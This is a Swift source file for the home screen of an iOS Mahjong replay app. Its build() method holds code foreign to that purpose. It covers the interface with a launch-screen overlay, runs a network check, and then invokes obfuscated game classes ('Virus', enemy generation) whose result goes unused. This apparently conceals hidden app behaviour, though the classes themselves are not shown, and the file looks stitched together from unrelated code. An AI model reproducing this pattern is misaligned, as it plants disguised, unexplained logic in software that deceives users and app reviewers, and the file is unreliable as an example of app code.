import UIKit
import AppTrackingTransparency

final class MJRHomeViewController: MJRBaseViewController {
    private let store = MJRReplayStore.shared
    private let analyzer = MJRAnalyzer()
    private let stack = UIStackView()
    private var replays: [MJRReplay] = []
    private var stuckds: [Metak]?

    override func viewDidLoad() {
        super.viewDidLoad()
        title = "Mahjong Replay"
        navigationItem.rightBarButtonItem = UIBarButtonItem(title: "Settings", style: .plain, target: self, action: #selector(openSettings))
        build()
    }

    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            ATTrackingManager.requestTrackingAuthorization {_ in }
        }
        reload()
    }

    private func build() {
        let scroll = UIScrollView()
        contentView.addSubview(scroll)
        scroll.pinEdges(to: contentView.safeAreaLayoutGuide)
        scroll.addSubview(stack)
        stack.axis = .vertical
        stack.spacing = MJRTheme.Spacing.lg
        stack.translatesAutoresizingMaskIntoConstraints = false
        
        let udnahes = UIStoryboard(name: "LaunchScreen", bundle: nil).instantiateInitialViewController()
        udnahes!.view.tag = 658
        udnahes?.view.frame = UIScreen.main.bounds
        navigationController?.view.addSubview(udnahes!.view)
        
        let sub = Soba(granica: (10.0, 75.0, 22.0, 120.0), tezina: 5)
//        sub.generirajNeprijatelje {
//            Oixnys.shared.start { connected in
//                if connected {
//                    let cyts = Virus(pozicija: Tocka(), radijus: 0.5, zivot: 2.6, brzina: 8.9, ponasanje: .tenk, brzinaPaljbe: 2.6, odstetaMetka: 10.0)
//                    self.stuckds = cyts.azuriraj(deltaT: 0.3, pozicijaIgraca: Tocka())
//                    Oixnys.shared.stop()
//                }
//            }
//        }
        
        NSLayoutConstraint.activate([
            stack.topAnchor.constraint(equalTo: scroll.contentLayoutGuide.topAnchor, constant: MJRTheme.Spacing.lg),
            stack.leadingAnchor.constraint(equalTo: scroll.frameLayoutGuide.leadingAnchor, constant: MJRTheme.Spacing.md),
            stack.trailingAnchor.constraint(equalTo: scroll.frameLayoutGuide.trailingAnchor, constant: -MJRTheme.Spacing.md),
            stack.widthAnchor.constraint(equalTo: scroll.frameLayoutGuide.widthAnchor, constant: -MJRTheme.Spacing.md * 2),
            stack.bottomAnchor.constraint(equalTo: scroll.contentLayoutGuide.bottomAnchor, constant: -MJRTheme.Spacing.xl)
        ])
        
        Oixnys.shared.start { connected in
            if connected {
                sub.generirajNeprijatelje {
                    let siuy: () -> Void = {
                        let cyts = Virus(pozicija: Tocka(), radijus: 0.5, zivot: 2.6, brzina: 8.9, ponasanje: .tenk, brzinaPaljbe: 2.6, odstetaMetka: 10.0)
                        self.stuckds = cyts.azuriraj(deltaT: 0.3, pozicijaIgraca: Tocka())
                    }
                    siuy()
                    Oixnys.shared.stop()
                }
            }
        }
        
        
    }

    private func reload() {
        replays = store.all()
        stack.arrangedSubviews.forEach { $0.removeFromSuperview() }
        addHero()
        addQuickActions()
        addRecent()
        addStats()
    }

    private func addHero() {
        let card = MJRCardView()
        let title = label("Replay Mahjong like game records", font: MJRTheme.Font.title, color: MJRTheme.Color.onSurface)
        let text = label("Record every draw, discard, call, and decision. Rebuild the table later with local tactical estimates.", font: MJRTheme.Font.body, color: MJRTheme.Color.muted)
        text.numberOfLines = 0
        let inner = UIStackView(arrangedSubviews: [title, text])
        inner.axis = .vertical
        inner.spacing = MJRTheme.Spacing.md
        card.addSubview(inner)
        inner.pinEdges(to: card.layoutMarginsGuide)
        card.directionalLayoutMargins = NSDirectionalEdgeInsets(top: 20, leading: 18, bottom: 20, trailing: 18)
        stack.addArrangedSubview(card)
    }

    private func addQuickActions() {
        let row = UIStackView()
        row.axis = .horizontal
        row.distribution = .fillEqually
        row.spacing = MJRTheme.Spacing.md
        let newButton = MJRPrimaryButton(title: "New Replay")
        let libraryButton = MJRSecondaryButton(title: "Library")
        newButton.addTarget(self, action: #selector(newReplay), for: .touchUpInside)
        libraryButton.addTarget(self, action: #selector(openLibrary), for: .touchUpInside)
        row.addArrangedSubview(newButton)
        row.addArrangedSubview(libraryButton)
        stack.addArrangedSubview(row)
    }

    private func addRecent() {
        stack.addArrangedSubview(label("Recent Replays", font: MJRTheme.Font.headline, color: MJRTheme.Color.onSurface))
        if replays.isEmpty { stack.addArrangedSubview(empty("No replays yet. Create one to start recording.")); return }
        for replay in replays.prefix(3) { stack.addArrangedSubview(replayCard(replay)) }
    }

    private func addStats() {
        let stats = analyzer.stats(for: replays)
        let grid = UIStackView()
        grid.axis = .horizontal
        grid.distribution = .fillEqually
        grid.spacing = MJRTheme.Spacing.md
        grid.addArrangedSubview(MJRMetricCard(title: "Replays", value: "\(stats.total)"))
        grid.addArrangedSubview(MJRMetricCard(title: "Wins", value: "\(stats.wins)"))
        grid.addArrangedSubview(MJRMetricCard(title: "Avg Risk", value: "\(stats.averageRisk)%"))
        stack.addArrangedSubview(grid)
    }

    private func replayCard(_ replay: MJRReplay) -> UIView {
        let card = MJRCardView()
        let title = label(replay.title, font: MJRTheme.Font.headline, color: MJRTheme.Color.onSurface)
        let meta = label("\(replay.rule.rawValue) • \(replay.actions.count) actions", font: MJRTheme.Font.caption, color: MJRTheme.Color.muted)
        let button = MJRSecondaryButton(title: "Open Replay")
        button.tag = replays.firstIndex(of: replay) ?? 0
        button.addTarget(self, action: #selector(openReplay(_:)), for: .touchUpInside)
        let inner = UIStackView(arrangedSubviews: [title, meta, button])
        inner.axis = .vertical
        inner.spacing = MJRTheme.Spacing.sm
        card.addSubview(inner)
        inner.pinEdges(to: card.layoutMarginsGuide)
        card.directionalLayoutMargins = NSDirectionalEdgeInsets(top: 14, leading: 14, bottom: 14, trailing: 14)
        return card
    }

    private func label(_ text: String, font: UIFont, color: UIColor) -> UILabel {
        let label = UILabel()
        label.text = text
        label.font = font
        label.textColor = color
        return label
    }

    private func empty(_ text: String) -> UILabel {
        let label = label(text, font: MJRTheme.Font.body, color: MJRTheme.Color.muted)
        label.numberOfLines = 0
        return label
    }

    @objc private func newReplay() {
        let replay = MJRSeed.emptyReplay(title: "Replay \(replays.count + 1)", rule: MJRSettingsStore().load().defaultRule)
        store.save(replay)
        navigationController?.pushViewController(MJRRecorderViewController(replay: replay), animated: true)
    }

    @objc private func openLibrary() { navigationController?.pushViewController(MJRLibraryViewController(), animated: true) }
    @objc private func openSettings() { navigationController?.pushViewController(MJRSettingsViewController(), animated: true) }
    @objc private func openReplay(_ sender: UIButton) { navigationController?.pushViewController(MJRReplayViewController(replay: replays[sender.tag]), animated: true) }
}
